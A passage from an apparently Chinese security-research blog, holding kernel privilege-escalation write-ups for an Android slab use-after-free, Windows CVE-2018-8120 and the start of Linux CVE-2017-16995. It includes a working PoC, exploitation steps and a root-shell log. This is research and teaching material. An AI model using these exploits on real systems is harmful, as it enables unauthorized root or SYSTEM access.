内存每次申请内存和释放内存都不会和伙伴系统直接打交道，提高了分配效率 Slab分配器的工作 首先会向伙伴系统申请一块内存 然后Slab分配器将申请的内存分成相同大小的对象(slab)放到高速缓存中(通过struct kmem_cache结构体来描述一个高速缓存) 当内核需要申请内存时通过调用kmalloc函数向Slab分配器申请内存，Slab分配器会查找当前高速缓存中是否有可分配的内存，若没有可分配的内存则向伙伴系统索要新的内存块以供分配，否则直接返回查找到的空闲内存给内核 伙伴系统，Slab管理器和内核之间的关系我感觉就像[供货商(buddySystem)-采购商(Slab管理器)-商铺(高速缓存)-商品(slab对象)-客户(内核kmalloc)]一样。 高速缓存前面讲了Slab分配器的工作原理提到了高速缓存，那什么是高速缓存呢？其实高速缓存就是一个数据结构(struct kmem_cache)，用来管理Slab分配器从buddy system那申请过来的若干大小相同的对象(object)内核在系统启动初始化阶段会创建多个通用高速缓存和专用高速缓存，这两种高速缓存管理方式是一致的，只是它们的用途不一样而已。 通用高速缓存：一般用于常规的内存分配，如内核需要申请一块200 byte大小的内存，Slab管理器会在通用高速缓存中匹配和申请的大小最接近的高速缓存，由于对齐问题，只会匹配到空间大于我们申请的大小的缓存块而不会小于，这里我们申请的大小是200那么会匹配到”kmalloc-256”这块高速缓存，并从中分配一个对象返回给内核以供使用。 专用高速缓存：一般用于存放特定的结构体对象如当内核创建一个新任务时，他会从task_struct的专用缓存中获得struct task_struct对象所需要的内存，缓存上一般会有已分配好的并标记为空闲的struct task_struct对象来满足请求。 在linux上一般可以通过读取/proc/slabinfo这个文件来获取当前系统存在的一些高速缓存，不过android上一般没有该文件。 slab申请/释放在进行漏洞利用之前我们还得来了解一些slab对象的申请流程与释放流程。首先我们需要了解几个内核结构体1234567891011121314151617181920212223242526272829303132333435363738394041424344struct kmem_cache &#123; struct kmem_cache_cpu __percpu *cpu_slab; /*一个per cpu变量，对于每个cpu来说，相当于一个本地内存缓存池。当分配内存的时候优先从本地cpu分配内存以保证cache的命中率*/ /* Used for retriving partial slabs etc */ unsigned long flags; unsigned long min_partial; /*限制struct kmem_cache_node中的partial链表slab的数量。虽说是mini_partial，但是代码的本意告诉我这个变量是kmem_cache_node中partial链表最大slab数量，如果大于这个mini_partial的值，那么多余的slab就会被释放。*/ int size; /*实际分配的大小 size(按对齐的方式分配出来的)*/ int object_size; /*申请时的大小 object size，就是创建kmem_cache时候传递进来的参数。和size的关系就是，size是各种地址对齐之后的大小。因此，size要大于等于object_size。*/ int offset; /* Free pointer offset. */ int cpu_partial; /*per cpu partial中所有slab的free object的数量的最大值，超过这个值就会将所有的slab转移到kmem_cache_node的partial链表。*/ struct kmem_cache_order_objects oo; /* Allocation and freeing of slabs */ struct kmem_cache_order_objects max; struct kmem_cache_order_objects min; gfp_t allocflags; /* gfp flags to use on each alloc */ int refcount; /* Refcount for slab cache destroy */ void (*ctor)(void *); int inuse; /*object_size按照word对齐之后的大小。*/ int align; /*字节对齐大小。*/ int reserved; /* Reserved bytes at the end of slabs */ const char *name; /* Name (only for display!) */ struct list_head list; /*系统有一个slab_caches链表，所有的slab都会挂入此链表。*/ int red_left_pad; /* Left redzone padding size */ #ifdef CONFIG_SYSFS struct kobject kobj; /* For sysfs */#endif#ifdef CONFIG_MEMCG_KMEM struct memcg_cache_params memcg_params; int max_attr_size; /* for propagation, maximum size of a stored attr */#ifdef CONFIG_SYSFS struct kset *memcg_kset;#endif#endif#ifdef CONFIG_NUMA int remote_node_defrag_ratio;#endif#ifdef CONFIG_SLAB_FREELIST_RANDOM unsigned int *random_seq;#endif#ifdef CONFIG_KASAN struct kasan_cache kasan_info;#endif struct kmem_cache_node *node[MAX_NUMNODES]; /*slab节点。在NUMA系统中，每个node都有一个struct kmem_cache_node数据结构*/&#125;; 123456789struct kmem_cache_cpu &#123; void **freelist; /* Pointer to next available object */ /*指向下一个可用的object。*/ unsigned long tid; /* Globally unique transaction id */ /*一个神奇的数字，主要用来同步作用的。*/ struct page *page; /* The slab from which we are allocating */ /*slab内存的page指针。*/ struct page *partial; /* Partially allocated frozen slabs */ /*本地slab partial链表。主要是一部分使用object的slab。*/#ifdef CONFIG_SLUB_STATS unsigned stat[NR_SLUB_STAT_ITEMS];#endif&#125;; 123456789101112131415161718192021222324struct kmem_cache_node &#123; spinlock_t list_lock; #ifdef CONFIG_SLAB struct list_head slabs_partial; /* partial list first, better asm code */ struct list_head slabs_full; struct list_head slabs_free; unsigned long free_objects; unsigned int free_limit; unsigned int colour_next; /* Per-node cache coloring */ struct array_cache *shared; /* shared per node */ struct alien_cache **alien; /* on other nodes */ unsigned long next_reap; /* updated without locking */ int free_touched; /* updated without locking */#endif#ifdef CONFIG_SLUB unsigned long nr_partial; /*slab节点中slab的数量*/ struct list_head partial; /*slab节点的slab partial链表，和struct kmem_cache_cpu的partial链表功能类似。*/#ifdef CONFIG_SLUB_DEBUG atomic_long_t nr_slabs; atomic_long_t total_objects; struct list_head full;#endif#endif&#125;; slab申请流程分配流程如下：优先从cpu本地高速缓存中分配，如果per cpu freelist中没有空闲的内存可供分配了，那么就从per cpu partial链表中分配，如果per cpu partial也没有可以被分配的对象那么继续查看per node partial链表中是否有可供分配的，如果很不幸也没找到可以使用的对象那Slab管理器就从伙伴系统中申请一个空闲的slab对象链表，并挂入到per cpu freelist中以供内核的申请。内存申请顺序：per cpu freelist -&gt; per cpu partial -&gt; per node partial slab释放流程释放流程如下：如果当前被释放的slab对象所在的page和cpu本地高速缓存的page一致，那么直接通过快释放路径释放到per cpu freelist，否则进入慢释放路径，慢释放路径首先把释放对象释放到该对象所在page的freelist上，然后page的引用计数(inuse)减1，接着判断释放掉当前obj后的slab page是否为empty，如果属于empty slab(inuse为0)，那么在满足kmem_cache_node的nr_partial大于kmem_cache的min_partial的情况下，释放该slab page到伙伴系统。否则如果slab对象所属链表状态为full，那么释放之后该slab对象链表就属于partial empty链表，就从full链表中删除并且添加到per cpu partial链表中。 利用思路前面提到过该漏洞的造成的结果就是触发漏洞时破坏了当时高速缓存的freelist指针，导致当时page空闲的所有slab对象都会被重复分配，也就是一块内存被两个sock对象同时指向，我们可以通过close第一个socket描述符去释放该内存，但是第二个socket描述符对该内存还有引用，这就把类型混淆转换成了释放后重引用问题，我们可以在第一次close之后对释放的内存进行喷射占位，第二次close的时候使用的就是我们前面喷射的数据了，从而达到控制内核执行流的效果。但由于涉及到的对象使用的是专用缓存，所以我们通过常规的堆喷射无法喷射成功，需要先通过堆风水把该对象从专用缓存转为通用缓存，然后再去喷射才能如我们所愿顺利控制内存中的内容。如何把专用缓存转换为通用缓存呢？通过申请大量的专用缓存，当Slab管理器发现过多的空闲缓存后会把这些空闲内存释放回伙伴系统，这样就有机会被通用缓存分配到。 Heap Fenshui大概的一个布局流程1234567891011创建大量的酱油线程，构造full slab触发漏洞,实现双重分配释放第一重分配的sock，促使受害者slab对象对应的page的inuse变量为0 new.inuse需要为0间隔释放酱油线程，构造大量的partial slab n-&gt;nr_partial &gt;= s-&gt;min_partial(node结构体的nr_partial的数量必须大于等于keme_cache的min_partial的数量)系统会把空闲slab对象返回给buddy系统 discard_slab(s, page);然后通过kmalloc喷射占位原始的sock-A接着释放sock-B，就会触发UAF inet_release -&gt; sk-&gt;sk_prot-&gt;close &gt;&gt;&gt;&gt;&gt;&gt; good 关键姿势1234567891011121314一个kmem_cache中的一个page能够分配多少个sock变量; ---&gt; 0x12; keme_cache -&gt; per cpu -&gt; page 每个page 可分配多少个 slab对象(sock变量)酱油sock的个数; ---&gt; 50 * 12; 一共50组每组12个,这个应该只要是2的倍数就行吧重复分配的个数; ---&gt; 36; 为什么是36? 一个page最多分配0x12个slab对象,由于会出现重复分配,所以为了把稳直接使用0x12 * 2 = 0x22（36）喷射数据的大小 slab-&gt;size的值即可第二重释放时因为sock内存被损坏，所以每释放一次需要检查一下喷射利用成功没，如果成功了 后面的sock就不能释放了不然会出现崩溃情况喷射的字符串首地址可能和内存中的sock首地址不完全重合，可以通过gef的pattern命令生成随机字符串来定位构造目标位置因为漏洞能够直接覆盖掉函数指针，并且是由用户进程调用的被修改函数，所以可以直接把修改函数设置为kernel_sock_ioctl函数来修改addr_limit 劫持内核执行流基于我们喷射成功的情况下，通过close函数去关闭socket描述符会触发以下的函数链:1234应用层：close()------------------------------------------------内核层：inet_release \\__ sk-&gt;sk_prot-&gt;close 由于sk的内容已经被我们控制了，所以只需要简单布局下内存就能控制住内核的执行流程了。 实现提权123456789101112131415161718192021222324bullhead:/data/local/tmp $ ./SwAK[+] uid:2000 pid:6082_____________ _______________ _______________ ____ ______ ________.________ ________ ______\\_ ___ \\ \\ / /\\_ _____/ \\_____ \\ _ \\/_ |/ __ \\ / __ \\ ____// _____/ / __ \\/ \\ \\/\\ Y / | __)_ ______ / ____/ /_\\ \\| |&gt; &lt; ______ \\____ /____ \\/ __ \\ &gt; &lt;\\ \\____\\ / | \\ /_____/ / \\ \\_/ \\ / -- \\ /_____/ / // \\ |__\\ \\/ -- \\_\\______ / \\___/ /_______ / \\_______ \\_____ /___\\______ / /____//______ /\\_____ /\\______ / \\/ \\/ \\/ \\/ \\/ \\/ \\/ \\/[+] CreateHoldSock Begin[+] CreateHoldSock End[+] MaskSK:0x7b0ba0d000 : Mmap_A:0x7b0ba14000[+] Exploit Begin[+] FreeHoldSock Begin[+] FreeHoldSock End[+] close succe 18 :[*] test for r/w selinux_enforcing @ffffffc001b8fa8c success[*] get root,patch cred &amp;&amp; sid[+] uid:0 pid:6082bullhead:/data/local/tmp # iduid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:toolbox:s0bullhead:/data/local/tmp # getprop ro.vendor.build.fingerprintgoogle/bullhead/bullhead:8.1.0/OPM6.171019.030.B1/4768815:user/release-keysbullhead:/data/local/tmp # 总结对Linux内核的好多机制还不够熟悉，很多漏洞都需要结合内核机制才能完成利用，还需要多看看内核源码啊。该漏洞还可以发挥更大的作用比如绕过一些保护机制，不过还没想到怎么玩o(╥﹏╥)o有了想法就去验证，不要嫌麻烦偷懒啊。 参考https://blog.csdn.net/u014089131/article/details/72782624 slub释放/申请http://blog.chinaunix.net/uid-7494944-id-3833334.html slub/slab中的一些问题 释放/申请https://awakening-fong.github.io/posts/mm/slub_partial/ slub : node partial和cpu partialhttp://blog.chinaunix.net/uid-26859697-id-5512117.html slub分配算法https://mp.weixin.qq.com/s/3eR3f8RfjCstYMqvPZayHw 图解slub","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2018-8120","slug":"CVE-2018-8120","date":"2018-08-26T10:22:47.000Z","updated":"2018-08-26T16:21:56.516Z","comments":true,"path":"2018/08/26/CVE-2018-8120/","link":"","permalink":"http://github.com/2018/08/26/CVE-2018-8120/","excerpt":"","text":"CVE-2018-8120 相关信息：An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory, aka “Win32k Elevation of Privilege Vulnerability.” This affects Windows Server 2008, Windows 7, Windows Server 2008 R2. (当win32k组件无法正确处理内存中的对象时，windows中就存在一个空指针解引用漏洞，可以用来做特权提升，即”Win32k特权漏洞提升”,这会影响Windows Server2008，windows 7和windows server 2008 r2)补丁链接：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120 测试环境：OS 名称: Microsoft Windows 7 专业版-&gt;X64OS 版本: 6.1.7600 Build 7600 漏洞成因：在win32k.sys的NtUserSetImeInfoEx函数中，因为未对窗口站rpwinsta变量的spklList元素做是否为空的检测，导致在使用spklList的时候会存在一个空指针解引用的问题，如果当前进程创建一个spklList成员为null的窗口站，然后将这个新创建的窗口站与当前进程关联，在调用NtUserSetImeInfoEx函数对输入法设置扩展IME信息时，将会获取spklList成员指向的内存中的数据，因为此时该成员为0，所以就会访问位于用户地址空间的零号内存。因为默认零号内存是未映射的所以此操作会导致页面错误，导致系统蓝屏发生。常见的利用思路可以事先把零号内存申请出来，然后在用户层构造假的tagKL内核对象，导致内核会误认为是正确的键盘布局tagKL节点对象，从而实现任意地址写任意值的目的，当我们能够实现任意地址任意写后我们可以把特定的内核对象的函数指针字段修改为我们shellcode的地址或修改内核模式或用户模式的执行的相关标志位，然后就有了任意代码执行的能力。 漏洞细节：首先我们来熟悉一下NtUserSetImeInfoEx函数，该函数主要是用于将用户进程定义的输入法扩展信息IME对象设置成当前进程所关联的窗口站中的键盘布局节点对象中的IME对象。该函数存放于win32k.sys文件中，可以获取测试机中的win32k.sys文件，让ida进行反编译，以下是我测试环境中的NtUserSetImeInfoEx函数，123456789101112131415161718192021222324252627282930313233343536373839404142434445464748__int64 __fastcall NtUserSetImeInfoEx(tagIMEINFOEX *Src)&#123; tagIMEINFOEX *v1; // rbx unsigned int v2; // ebx tagIMEINFOEX *v3; // rcx char v4; // al tagWINDOWSTATION *rpwinsta; // rcx _tagKL *pkl; // rax tagIMEINFOEX *v7; // rcx HKL__ *ime_info_ex; // [rsp+20h] [rbp-178h] v1 = Src; *(_QWORD *)&amp;gptiCurrent = ExEnterPriorityRegionAndAcquireResourceExclusive(gpresUser); gbValidateHandleForIL = 1; if ( *gpsi &amp; 4 ) &#123; v3 = v1; if ( v1 &gt;= W32UserProbeAddress ) v3 = (tagIMEINFOEX *)W32UserProbeAddress; v4 = (char)v3-&gt;hkl; memmove(&amp;ime_info_ex, v1, 0x160ui64); rpwinsta = *(tagWINDOWSTATION **)(PsGetCurrentProcessWin32Process() + 0x258i64); /*-[ 1 ]-*/ v2 = 0; if ( rpwinsta ) /*-[ 2 ]-*/ &#123; pkl = (_tagKL *)rpwinsta-&gt;spklList; /*-[ 3 ]-*/ while ( pkl-&gt;hkl != ime_info_ex ) /*-[ 4 ]-*/ &#123; pkl = pkl-&gt;pklNext; if ( pkl == rpwinsta-&gt;spklList ) goto LABEL_14; &#125; v7 = pkl-&gt;piiex; /*-[ 5 ]-*/ if ( v7 ) &#123; if ( !v7-&gt;fLoadFlag ) memmove(v7, &amp;ime_info_ex, 0x160ui64); /*-[ 6 ]-*/ v2 = 1; &#125; &#125; &#125; else&#123; UserSetLastError(0x78i64); v2 = 0; &#125;LABEL_14: UserSessionSwitchLeaveCrit(); return v2;&#125; 首先熟悉一下该函数的执行流程。[1]-获取当前进程的窗口站对象rpwinsta，什么是窗口站？ 窗口站是一个内核对象，包含剪切板，原子表和一个或多个桌面对象，每个窗口站对象作为结构体tagWINDOWSTATION的实例存在于内核中，以下为窗口站结构体1234567891011121314151617181920210: kd &gt; dt win32k!tagWINDOWSTATION+ 0x000 dwSessionId : Uint4B+ 0x008 rpwinstaNext : Ptr64 tagWINDOWSTATION+ 0x010 rpdeskList : Ptr64 tagDESKTOP+ 0x018 pTerm : Ptr64 tagTERMINAL+ 0x020 dwWSF_Flags : Uint4B+ 0x028 spklList : Ptr64 tagKL+ 0x030 ptiClipLock : Ptr64 tagTHREADINFO+ 0x038 ptiDrawingClipboard : Ptr64 tagTHREADINFO+ 0x040 spwndClipOpen : Ptr64 tagWND+ 0x048 spwndClipViewer : Ptr64 tagWND+ 0x050 spwndClipOwner : Ptr64 tagWND+ 0x058 pClipBase : Ptr64 tagCLIP+ 0x060 cNumClipFormats : Uint4B+ 0x064 iClipSerialNumber : Uint4B+ 0x068 iClipSequenceNumber : Uint4B+ 0x070 spwndClipboardListener : Ptr64 tagWND+ 0x078 pGlobalAtomTable : Ptr64 Void+ 0x080 luidEndSession : _LUID+ 0x088 luidUser : _LUID+ 0x090 psidUser : Ptr64 Void [2]-判断当前窗口站rpwinsta是否为空，如果不为空就执行[3]。[3]-根据当前窗口站rpwinsta获取spklList成员，spklList指向的是关联的键盘布局对象链表的第一个节点指针，键盘布局tagKL结构体定义如下：1234567891011121314151617180: kd &gt; dt win32k!tagKL+ 0x000 head : _HEAD+ 0x010 pklNext : Ptr64 tagKL+ 0x018 pklPrev : Ptr64 tagKL+ 0x020 dwKL_Flags : Uint4B+ 0x028 hkl : Ptr64 HKL__+ 0x030 spkf : Ptr64 tagKBDFILE+ 0x038 spkfPrimary : Ptr64 tagKBDFILE+ 0x040 dwFontSigs : Uint4B+ 0x044 iBaseCharset : Uint4B+ 0x048 CodePage : Uint2B+ 0x04a wchDiacritic : Wchar+ 0x050 piiex : Ptr64 tagIMEINFOEX+ 0x058 uNumTbl : Uint4B+ 0x060 pspkfExtra : Ptr64 Ptr64 tagKBDFILE+ 0x068 dwLastKbdType : Uint4B+ 0x06c dwLastKbdSubType : Uint4B+ 0x070 dwKLID : Uint4B [4]-遍历关联键盘布局对象链表，该循环存在两个出口 1. 当遍历到的键盘布局对象的hkl成员等于传入的IME对象时结束循环，这种情况表示找到了hkl等于传入的IME对象的键盘布局对象，然后结束循环，执行[5] 2. 当遍历到的键盘布局对象再次等于第一个键盘布局对象节点时，这种情况表示链表遍历完毕后还未找到目标对象，所以直接跳到函数的末尾。 [5]-获取目标键盘布局对象中的piiex成员，piiex成员指向需要关联的输入法扩展IME信息对象，结构如下：123456789101112130: kd&gt; dt win32k!tagIMEINFOEX+ 0x000 hkl : Ptr64 HKL__+ 0x008 ImeInfo : tagIMEINFO+ 0x024 wszUIClass : [16] Wchar+ 0x044 fdwInitConvMode : Uint4B+ 0x048 fInitOpen : Int4B+ 0x04c fLoadFlag : Int4B+ 0x050 dwProdVersion : Uint4B+ 0x054 dwImeWinVersion : Uint4B+ 0x058 wszImeDescription : [50] Wchar+ 0x0bc wszImeFile : [80] Wchar+ 0x15c fSysWow64Only : Pos 0, 1 Bit+ 0x15c fCUASLayer : Pos 1, 1 Bit [6]-最终的拷贝操作，如果目标键盘布局对象不为空，并且fLoadFlag成员为false，那么就把传入的IME对象拷贝到目标键盘布局对象的piiex成员指向的IME信息对象处。 通过补丁对比可以知道补丁其实就是在[2]的位置对当前窗口站rpwinsta变量的spklList成员做是否为空的检测，这样我们就知道了修补的漏洞可能是因为spklList为空导致的，假设spklList为空，那么在接下来的访问操作中就会触发访问异常问题，从而导致BSOD(Blue Screen of Death)。 漏洞验证：poc：当用户进程调用CreateWindowStation函数创建一个新的窗口站时，新的窗口站对象的spklList成员是没有被初始化的，默认指向NULL地址，然后使用SetProcessWindowsStation将新窗口站与当前进程关联起来，再通过调用NtUserSetImeInfoEx函数来触发该漏洞，从而验证漏洞的存在。CVE-2018-8120-poc.cpp123456789101112131415161718192021222324252627282930313233343536373839#include \"stdafx.h\"#define PSAPI_VERSION 1#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;Psapi.h&gt;#include &lt;intrin.h&gt; #pragma comment(lib, \"Psapi.lib\")struct tagIMEINFO32&#123; unsigned int dwPrivateDataSize; unsigned int fdwProperty; unsigned int fdwConversionCaps; unsigned int fdwSentenceCaps; unsigned int fdwUICaps; unsigned int fdwSCSCaps; unsigned int fdwSelectCaps;&#125;;typedef struct tagIMEINFOEX&#123; HKL__ *hkl; tagIMEINFO32 ImeInfo; wchar_t wszUIClass[16]; unsigned int fdwInitConvMode; int fInitOpen; int fLoadFlag; unsigned int dwProdVersion; unsigned int dwImeWinVersion; wchar_t wszImeDescription[50]; wchar_t wszImeFile[80]; __int32 fSysWow64Only : 1; __int32 fCUASLayer : 1;&#125;IMEINFOEX, *PIMEINFOEX;extern \"C\" void NtUserSetImeInfoEx(PVOID);int main()&#123; IMEINFOEX ime; RtlSecureZeroMemory(&amp;ime, sizeof(IMEINFOEX)); HWINSTA hSta = CreateWindowStationW(0,0,READ_CONTROL,0); SetProcessWindowStation(hSta); NtUserSetImeInfoEx((PVOID)&amp;ime); return 0;&#125; asm.asm12345678910public NtUserSetImeInfoEx_TEXT SEGMENTNtUserSetImeInfoEx PROC mov r10,rcx; mov eax,4871; syscall; ret;NtUserSetImeInfoEx ENDP_TEXT ENDSEND 因为我的虚拟机是X64，而vs2015编译x64程序不支持内联汇编，所以需要新创建一个.asm文件来写汇编代码，编译生成的方式可以参考：vs2015下汇编代码与c/c++代码混合编程 poc编译完成后，甩到虚拟机中遛一遛，会发现直接把虚拟机给打蓝屏了，ok，就是要的这个效果但是这还没有达到我们最终的目的，我们的目的是特权提升，继续我们的利用之路 漏洞利用：构造数据：通过前面的分析我们知道，该漏洞主要是访问零地址的时候因为零地址未被映射而导致访问异常，如果我们能够事先把零页给映射出来，然后再精心构造一下这块内存的数据，这样不但不会导致内核出现访问异常，还可以控制内核的执行逻辑，从而实现提权操作。 首先我们需要把0地址内存给申请出来，这里关于虚拟空间分布的知识需要了解。 32位windows系统中，可使用的虚拟地址空间大小共计2^32字节（4GB）。通常低地址的2GB用于用户空间，而高地址的2GB用于内核空间。 64位windows系统中，虚拟地址空间理论上的大小为2^64字节，但实际只使用了一部分，范围从0x000’0000’0000至0x7FF’FFFF’FFFF的8TB用于用户空间，范围从0xFFFF’0800’0000’0000至0xFFFF’FFFF’FFFF’FFFF的248TB的部分用于内核空间。 而空指针赋值分区是进程地址空间中从0x0000’0000到0x0000’FFFF的闭区间，保留该分区的目的是为了帮助程序员捕获对空指针的赋值，而如果进程中的线程试图读取或写入位于这一分区的内存地址，则会引发访问异常。 虚拟地址分区x86普通模式x86 3G用户模式x64 64位Windows空指针赋值分区0x000000000x0000FFFF0x000000000x0000FFFF0x00000000 000000000x00000000 0000FFFF用户模式分区0x000100000x7FFEFFFF0x00010000xBFFEFFFF0x00000000 000100000x000007FF FFFEFFFF64KB禁入分区0x7FFF00000x7FFFFFFF0xBFFF00000xBFFFFFFF0x000007FF FFFF00000x000007FF FFFFFFFF内核模式分区0x800000000xFFFFFFFF0xC00000000xFFFFFFFF0x00000800 000000000xFFFFFFFF FFFFFFFF虚拟地址空间分布表 1. 映射零页地址 2. 构造零页内存 Bitmap GDI函数实现内核任意地址读/写通过修改Bitmap GDI函数关键对象的方式可以将有限的任意地址写漏洞转化为内核任意地址读/写。当创建一个bitmap时，一个结构体被附加在进程PEB的GdiSharedHandleTable成员中。GdiSharedHandleTable是一个GDICELL64结构体数组的指针12345678typedf struct&#123; PVOID64 pKernelAddress; USHORT wProcessId; USHORT wCount; USHORT wupper; USHORT wType; PVOID64 pUserAddress;&#125; GDICELL64; 通过以下的方式获取Bitmap的内核地址： 触发漏洞:首先通过ba e 1 win32k!NtUserSetImeInfoEx对漏洞函数下断通过syscall调用漏洞函数NtUserSetImeInfoEx，并把我们构建好的内存布局当做参数传入，紧接着内核就会断在win32k!NtUserSetImeInfo函数调用处，来看下我们传给内核的应用层的数据，通过r 输出当前寄存器信息可以看到rcx指向的就是我们应用层构造的数据，单步运行接着内核会通过win32k!memmove函数把应用层的内存数据（0x1c3980）拷贝到内核内存（0xfffff88002943a60）中 接着内核调用PsGetCurrentProcessWin32Process函数获取当前进程的窗口站对象rpwinsta，并索引rpwinsta中的spklList元素，由于存在漏洞，并没有对获取到的pkl元素做合法检查，导致存在0地址解引用的问题，可以看到此时的rax等于0，紧接着索引pkl-&gt;hkl[rax+0x28]的数据，并与ime_info_ex进行比较，如果不等就进入循环，因为我们在触发漏洞之前对0号内存做映射了，所以pkl-&gt;hk和ime_info_ex都是我们可控的，这里的循环我们可以直接绕过。 循环完毕后会索引pkl-&gt;piiex的数据，如果获取的数据不为NULL，并且数据偏移0x4c中的值为0，那么就调用win32k!memmove函数直接把ime_info_ex指向的内存拷贝到pkl-&gt;piiex指向的位置，因为我们在最开始把pkl-&gt;piiex设置成了mpv，所以这里的拷贝就相当于对mpv做写操作，写入的内容是ime_info_ex中的内容，而ime_info_ex前8个字节存放的是wpv的地址，这就相当于把wpv写入到mpv中，我们的GDI内核任意读写就构造好了，接下来使用Gdi32的GetBitmapBits/SetBitmapBits两个函数来实现任意读写的功能，这样就成功完成了把有限的任意地址写转换成内核任意地址读/写。 有了任意读写的功能之后，我们可以替换HalDispatchTable里面的HalQuerySystemInformation函数指针为我们的提权shellcode，替换完成后调用NtQueryIntervalProfile来触发shellcode进行提权。 GDI任意读/写函数指针修改提权shellcode参考https://paper.seebug.org/602/ 文章https://github.com/bigric3/cve-2018-8120 32位源码https://github.com/unamer/CVE-2018-8120 64位源码 https://www.f-secure.com/weblog/archives/kasslin_AVAR2006_KernelMalware_paper.pdfhttp://vexillium.org/dl.php?call_gate_exploitation.pdf https://ti.360.net/blog/articles/analysis-of-cve-2018-8120-in-win-7-x64/http://www.freebuf.com/vuls/173798.html","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Windows_Kernel","slug":"Windows-Kernel","permalink":"http://github.com/tags/Windows-Kernel/"}]},{"title":"CVE-2017-16995","slug":"CVE-2017-16995","date":"2018-07-16T14:40:15.000Z","updated":"2019-10-26T03:20:02.121Z","comments":true,"path":"2018/07/16/CVE-2017-16995/","link":"","permalink":"http://github.com/2018/07/16/CVE-2017-16995/","excerpt":"","text":"前言漏洞信息 实验环境：ubuntu 16.4 漏洞类型：有无符号数比较导致整数扩展漏洞 linux补丁：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f 漏洞描述：在linux内核源码kernel/bpf/verifier.c中的check_alu_op函数允许本地用户通过构造不正确的符号导致一些意料之外的影响。 相关模块：bpf模块 漏洞原理基础知识BPF简介BPF(Berkeley Packet Filter)该机制最开始用来对数据包做过滤用的，一般用在对套接字做过滤的实现上，通过把写好的规则与指定的套接字做绑定(setsockopt)从而达到控制某些类型的数据是否通过目标socket的功能。本质上BPF其实是一种内核代码注入技术。在内核中实现了一eBPF虚拟机，通过在用户空间生成BPF目标码然后通过BPF接口把目标代码注入到内核中去，内核通过JIT(Jus-In-Time)将BPF目标编码转换为本地指令，当需要进行过滤的时候内核就会通过钩子函数来首先运行这些BPF代码。该机制的好处就在于能够在不修改内核代码的前提下修改内核处理某些数据的策略。既然提供了代码注入功能，那么该机制的安全问题就是重点，BPF提供了很多规则来限制用户态传入的BPF代码。确保被注入的代码都是属于合规代码。下面列出几个我们比较关注的限制规则。 一个BPF的代码不能超过BPF_MAXINSNS(4K),运行总步数不能超过32K(4.9改为了96K) 禁止代码存在循环操作，代码可能的总分支也被限制不能超过1K 限制不能访问全局变量，只能访问局部变量，如果需要访问全局变量则只能访问BPF map对象，该map对象是同时被用户态，BPF代码，内核态共同访问到。 对BPF代码的安全规则检查主要在BPF代码加载时，通过BPF verifier来实现。大致分为两步： 1.通过DAG(Directed Acyclic Graph有向无环图)的DFS(Depth-first Search)深度优先算法来遍历BPF程序的代码路径，确保无环路发生。 2.逐条检查BPF指令对register和对stack的影响，确保不存在各种越界读写等违规操作。 BPF系统调用我们来看下如何使用bpf机制，在内核中对外提供了一个系统调用bpf，通过传入不同参数分派不同函数去完成需要的功能。下面列一下本次相关的几个参数。12#include &lt;linux/bpf.h&gt; int bpf(int cmd, union bpf_attr *attr, unsigned int size); 几个相关的CMD选项：1234BPF_MAP_CREATE：(map_create(&amp;attr); /* BPF_MAP_CREATE创建映射表 */)BPF_MAP_LOOKUP_ELEM：(map_lookup_elem(&amp;attr); /* BPF_MAP_LOOKUP_ELEM命令用于查找条目 */)BPF_MAP_UPDATE_ELEM：(map_update_elem(&amp;attr); /* BPF_MAP_UPDATE_ELEM 命令用于向映射表中存储一个条目 value域是要存储的数据的指针 */)BPF_PROG_LOAD：(bpf_prog_load(&amp;attr); /* 加载到内核,检验安全性,JIT编译,分配句柄fd */) 注意：BPF虚拟指令存在11个虚拟寄存器，其中包括R0~R10，该寄存器与我们硬件CPU的物理寄存器所对应1234567891011R0 -- RAX（默认函数返回值寄存器）R1 -- RDI（R1 ~ R5 一般用来表示内核预设函数的参数）R2 -- RSIR3 -- RDXR4 -- RCXR5 -- R8R6 -- RBX（R6 ~ R9 在BPF代码中可以作存储用,其值不受内核预设函数影响）R7 -- R13R8 -- R14R9 -- R15R10 -- RBP(栈帧指针) 最后再简单了解一下ebpf的指令格式：在eBPF中，每条指令就是一个struct bpf_insn结构体,大小为8字节(1个字节8位共64位)。12345[0-7]位代表操作码，[8-11]位代表目标寄存器，[12-15]位代表源寄存器，[16-31]为代表操作的偏移值，[32-63]位代表操作的立即数。 12345678/* \\linux-4.4.1\\include\\uapi\\linux\\bpf.h */struct bpf_insn&#123; __u8 code; /* opcode */ __u8 dst_reg:4; /* dest register */ __u8 src_reg:4; /* source register */ __s16 off; /* signed offset */ __s32 imm; /* signed immediate constant */&#125; 这里举个栗子：比如说需要一个类似于令mov eax，0xffffffff的指令，则BPF指令如下：123456789#define BPF_MOV32_IMM(DST,IMM) \\ ((struct bpf_insn)&#123; \\ .code = BPF_ALU|BPF_MOV|BPF_K, \\ /* BPF_X代表寄存器，BPF_K代表立即数 */ .dst_reg = DST, \\ .src_reg = 0, \\ .off = 0, \\ .imm = IMM &#125;)opcode:\\xb4\\x09\\x00\\x00\\xff\\xff\\xff\\xffeBPF虚拟指令系统隶属于RISC（精简指令集），也就是每条指令的大小一致。 漏洞功能在linux内核源码kernel/bpf/verifier.c中的check_alu_op函数未对64位和32位的有符号数分开处理，导致本地用户可通过精心构造不正确的数据导致一些意料之外的影响。由于存在该漏洞导致对以下指令进行解析时模拟执行与实际执行的语义不一致，促使实际执行的指令并没有被检查到。1234BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF), /* r2 = (u32)0xFFFFFFFF */ \\BPF_JMP_IMM(BPF_JNE, BPF_REG_2, 0xFFFFFFFF, 2), /* if (r2 == -1) &#123; */ \\BPF_MOV64_IMM(BPF_REG_0, 0), /* exit(0); */ \\BPF_EXIT_INSN() /* &#125; */ \\ 